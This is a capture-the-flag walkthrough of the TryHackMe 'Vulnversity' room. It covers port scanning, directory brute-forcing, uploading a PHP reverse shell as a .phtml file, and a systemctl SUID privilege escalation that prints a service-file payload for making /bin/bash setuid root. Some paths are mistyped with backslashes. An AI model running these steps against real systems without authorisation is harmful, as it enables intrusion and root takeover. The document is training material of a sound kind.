 <div align = "center"> 22-Sep-2021, Wednesday<br>
  Notes by: Mayank Kumar Prajapati<br>
  Machine Name: Vulnversity<br>
  URL: https://tryhackme.com/room/vulnversity
</div>
<br><br>

***
**Phase 1: Reconnaissance**
***
`nmap -sV 10.10.227.240`

Scan the box, how many ports are open.\
6

What version of the squid proxy is running on the machine?\
3.5.12

How many ports will nmap scan if the flag -p-400 was used?\
400

Using the nmap flag -n what will it not resolve?\
DNS

What is the most likely operating system this machine is running?\
Ubuntu

What port is the web server running on?\
3333

***
 **Phase 2:  Locating directories using GoBuster**
 ***
`apt install gobuster`\
`gobuster dir -u http://10.10.227.240:3333/ -w /usr/share/wordlists/dirbusterdirectory-list-2.3-medium.txt`\
`gobuster dir -u http://10.10.227.240:3333/internal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

What is the directory that has an upload form page?\
/internal/

***
**Phase 3: Compromise the webserver**
***

Try upload a few file types to the server, what common extension seems to be blocked?\
.php

Which extension seems to be allowed to upload php reverse shell?\
.pthml \
You can try it out using [extensionChecker.py](https://github.com/mayank-s16/Tryhackme-machines-notes/blob/main/vulnversity/extensionChecker.py "Extension Checker Script") file that is uploaded in thie repo.<br>

What is the name of the user who manages the webserver?\
bill

What is the user flag?\
Find it inside bill's home directory.


***
**Phase 4: Privilege Escalation**
***
In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. 
SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
For example, the binary file to change your password has the SUID bit set on it (`/usr/bin/passwd`).
This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.<br>
Note down the below command for finding out files whose user bit is set.<br>
`find / -perm -u=s -type f 2>/dev/null`\

On the system, search for all SUID files. What file stands out?\
/bin/systemctl

Click [here](https://gtfobins.github.io/gtfobins/systemctl/#suid "GTFOBins SUID for systemctl") to find out privilege escalation using `systemctl` SUID.

Note** You can also set SUID bit of /bin/bash using systemctl GTFObins url. Modify the command part as
> TF=$(mktemp).service\
> echo '[Service]\
> Type=oneshot\
> ExecStart=/bin/sh -c "chmod +s /bin/bash"\
> [Install]\
> WantedBy=multi-user.target' > $TF\
> /bin/systemctl link $TF\
> /bin/systemctl enable --now $TF

After executing the above commands one by one it will set the uid bit of \bin\bash.
To confirm this thing type the following command.
> ls -l \bin\bash\
Now you can become root.
> \bin\bash -p
---
